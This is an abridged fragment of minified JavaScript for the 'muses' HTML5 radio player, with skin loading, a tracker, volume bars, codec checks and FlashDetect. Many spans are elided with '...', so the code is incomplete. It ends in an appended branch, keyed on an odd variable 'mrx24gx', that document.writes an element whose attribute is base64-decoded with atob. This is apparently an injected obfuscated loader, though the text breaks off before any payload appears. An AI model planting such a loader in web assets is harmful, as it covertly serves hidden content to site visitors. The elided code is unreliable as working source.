        F.__name__ = "muses.Tracker";
        F.track = function(a, b, c) {
            if (F.enabled && !("error" == a && 3 < ++F.trackedErrors)) {
                null ==
                    F.userLang && (F.userLang = window.navigator.language, F.userLang = null != F.userLang ? F.userLang.split("-")[0] : "N/A");
                var d = {
                    dimension1: c.ui.skin,
                    dimension2: c.getCurrentUrl() + " (" + c.name + ")",
                    dimension3: "2.4.4 (html5)",
                    dimension4: window.location.href,
                    dimension5: c.playerParams.codec,
                    dimension6: c.playerParams.lang,
                    dimension7: F.userLang
                };
                "stop" == b && (d.metric1 = c.ui.getPlayTime());
            }
        };
        F.initialize = function(a, b) {

        };
        var H = f.muses.UI = function(a,
            b) {
            this.toggleBuffer = !1;
            ...
            this.muses = a;
            this.language = Oa.factory(b.lang);
            ...
            this.statusText = new X(this);
            this.artistText = new X(this);
            this.songTitleText = new X(this);
            ...
            this.loadSkin(this.skin, function() {
                c.statusLed.configured &&
                    c.mainDiv.appendChild(c.statusLed.container);
                ...
                c.playButton.container.onclick =
                    function(d) {
                        c.muses.playAudio()
                    };
        ...
        H.prototype = {
            ...
            loadSkin: function(a, b) {
                ...
                d.onData = function(g) {
                    ...
                    for (g = h.parse(g).elements(); g.hasNext();) {
                        var e = g.next();
                        if (e.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " +
                            (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                        ...
                        0 < c.skinFolder.length && "/" != c.skinFolder.charAt(c.skinFolder.length -
                            1) && (c.skinFolder += "/");
                        c.skinFolder = c.makeAbsolute(c.skinFolder);
                        for (e = e.elements(); e.hasNext();) {
                            m = e.next();
                            c.XmlToLower(m);
                            if (m.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == m.nodeType ? "null" : w.toString(m.nodeType)));
            ...
            getPlayTime: function() {
                console.log("muses/UI.hx:188:", this.playStartedTimestamp);
            ...
            setError: function() {
                ...
                this.statusLed.off();
                F.track("error", "ioError", this.muses)
            },
            setVolume: function(a, b) {
            ...
            setMetadataFromString: function(a) {
                if (this.muses.isPlaying() && this.lastMetadata != a) {
                    var b = a.indexOf(" - ", 0); - 1 != b ? (this.artistText.setText(x.substr(a, 0, b)), this.songTitleText.setText(x.substr(a, b + 3, null))) : (this.artistText.setText(""), this.songTitleText.setText(a));
                    this.lastMetadata = a;
            ...
            showInfo: function(a, b) {
                null == b && (b = !0);
                null == a ? this.restoreTitle() : (null != this.titleTimer && this.titleTimer.stop(), this.statusText.setText(a), b && (this.titleTimer = new O(2E3), this.titleTimer.run = n(this, this.restoreTitle)))
            },
            ...
            showContextMenu: function(a) {
                ...
                a.preventDefault();
                F.track("ui", "showContextMenu", this.muses)
            },
            __class__: H
        };
        f = function() {
        ...
        var Oa = function() {};
        Oa.__name__ = "muses.internationalization.LanguageFactory";
        Oa.factory = function(a) {
        ...
        Y.__name__ = "muses.internationalization.Norwegian";
        Y.__super__ = f;
        Y.prototype = l(f.prototype, {
            __class__: Y
        });
        var Da = function() {
            this.byText = new z;
        ...
        var ha = function(a, b) {
            ...
            this.container.onmouseout = function(d) {
                c.mouseDownState.style.opacity = "0";
                c.mouseOverState.style.opacity =
                    "0"
            }
        };
        ...
        ha.prototype = l(I.prototype, {
            configure: function(a) {
                ...
                this.ui.loadImage(this.mouseOverState,
                    a.get("image"));
        ...
        na.prototype = l(I.prototype, {
            configure: function(a) {
                ...
                null != a.get("imagestop") &&
                    -1 == a.get("imagestop").indexOf(".swf") && (this.ui.loadImage(this.stopMC, a.get("imagestop")), this.appendChild(this.stopMC, !0))
            },
            on: function() {
        ...
        X.__name__ = "muses.skin.TitleText";
        X.__super__ = I;
        X.prototype = l(I.prototype, {
            ...
            setText: function(a) {
                if ("" == a) this.container.style.opacity = "0";
                    ...
                    var b = a + " &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;" + a;
                    this.innerDIV.innerHTML != a && this.innerDIV.innerHTML != b && (this.innerDIV.innerHTML = a, this.disableScrolling(), this.container.scrollWidth -
                        6 > this.styleWidth && (this.scrollDiff = this.container.scrollWidth, this.innerDIV.innerHTML = b, this.scrollDiff -= this.container.scrollWidth, this.scroll()))
                }
            },
            scroll: function() {
                var a = this;
        ...
        oa.prototype = l(I.prototype, {
            ...
            drawBars: function(a) {
                if (null != this.barColors && 0 != this.barStep &&
                    (a = Math.round((this.width - 2 * this.horizMargin) / this.barStep), 0 != a)) {
                    ...
                    if (null == this.bars) {
                        ...
                        for (var g = 0, e = a; g < e;) {
                            ...
                            this.bars.push(D);
                            this.appendChild(D);
                            D.style.left = Math.ceil(d + m * this.barStep) + "px";
                            D.style.top = Math.ceil(c - m * b) + "px";
                            D.style.width = Math.round(this.barWidth) + "px";
                            D.style.height = Math.ceil(m * b) + "px"
                        }
                    }
                    g = 0;
                    for (e = Math.round(this.volume * a); g < e;) m =
                        g++, this.bars[m].style.backgroundColor = this.barColors[0];
                    g = Math.round(this.volume * a);
                    for (e = a; g < e;) m = g++, this.bars[m].style.backgroundColor = this.barColors[1]
                }
            },
            setVolume: function(a, b) {
                null == b && (b = !1);
            ...
            touchMove: function(a) {
                ...
                this.mouseDown({
                    ...
                    layerY: a.changedTouches[0].clientY -
                        b.top
                })
            },
            configure: function(a) {
                ...
                this.setMode(b);
                if ("holder" == b || "vholder" == b) this.holder = new Image, this.holder.onload = n(this, this.holderLoad), this.ui.loadImage(this.holder, a.get("holderimage")),
    ...
    if ("undefined" == typeof musesCallback) var musesCallback = function(f, r) {};
    if ("undefined" == typeof musesPlayerCounter) {
        ...
        (function() {
            ...
            0 < f() && 11 > f() || (f = document.createElement("audio"), mrpBrowserCompat.aac = !(!f.canPlayType || !f.canPlayType("audio/mp4;").replace(/no/,
                "")), mrpBrowserCompat.mp3 = !(!f.canPlayType || !f.canPlayType("audio/mpeg;").replace(/no/, "")), mrpBrowserCompat.ogg = !(!f.canPlayType || !f.canPlayType("audio/ogg;").replace(/no/, "")))
        })()
    }
    var FlashDetect = new function() {
        ...
        var r = [{
                    ...
                    version: function(n) {
                        var t = "6,0,21";
                        try {
                            n.AllowScriptAccess = "always", t = l(n)
                        } catch (B) {}
                        return t
                    }
                },
        ...
        f.versionAtLeast = function(n) {
            var t = [f.major, f.minor, f.revision],
                B = Math.min(t.length, arguments.length);
            for (i = 0; i < B; i++)
                if (t[i] >= arguments[i]) {
                    if (!(i + 1 < B && t[i] == arguments[i])) return !0
                } else return !1
        };
        f.FlashDetect =
            function() {
                if (navigator.plugins && 0 < navigator.plugins.length) {
                    ...
                    if (n && n["application/x-shockwave-flash"] && n["application/x-shockwave-flash"].enabledPlugin && n["application/x-shockwave-flash"].enabledPlugin.description) {
                        ...
                        var B = n[2].split(/\./);
                        n = n[3];
                        var L = parseInt(B[0], 10);
                        var S = parseInt(B[1], 10);
                        var x = n;
                        var U = parseInt(n.replace(/[a-zA-Z]/g, ""), 10) || f.revision;
                        f.raw = t;
                        f.major = L;
                        f.minor = S;
                        f.revisionStr =
                    ...
                    for (n = -1, B = 0; B < r.length && -1 == n; B++) {
                        t = -1;
                        try {
                            t = new ActiveXObject(r[B].name)
                        } catch (k) {
                            t = {
                                activeXError: !0
                            }
                        }
                        t.activeXError || (f.installed = !0, n = r[B].version(t), -1 != n && (t = n, x = t.split(","), L = parseInt(x[0].split(" ")[1], 10), S = parseInt(x[1], 10), U = parseInt(x[2], 10), x = x[2], f.raw = t, f.major = L, f.minor = S, f.revision = U, f.revisionStr = x))
                    }
            }()
    };
    FlashDetect.JS_RELEASE = "1.0.4"
} 
else 1 == mrx24gx.length ? function(f, r, l, n, t, B, L) {
    r.write("<" +
        l + " " + f + '="' + atob(n) + '"></' + l + ">")
